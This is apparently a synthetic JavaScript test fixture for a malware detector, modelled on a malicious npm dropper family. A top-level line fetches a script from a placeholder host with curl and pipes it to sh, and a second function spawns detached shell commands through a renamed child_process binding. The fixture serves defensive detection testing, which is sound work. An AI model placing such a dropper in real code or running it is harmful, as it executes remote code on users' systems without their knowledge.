// SYNTHETIC recall fixture (mirrors the OSV MAL-2025-20690 family): the one-line
// `require('child_process').exec(...)` dropper, plus a call through a renamed module
// binding. Neither uses a bare `exec(` or a `child_process.`/`cp.` qualifier, so a
// pattern that only knows those forms misses both. Nothing is executed by tests.
require('child_process').exec('curl -s https://example.invalid/s | sh');

const proc = require('node:child_process');
function stage2(cmd) {
  return proc.spawn('sh', ['-c', cmd], { detached: true });
}

module.exports = { stage2 };
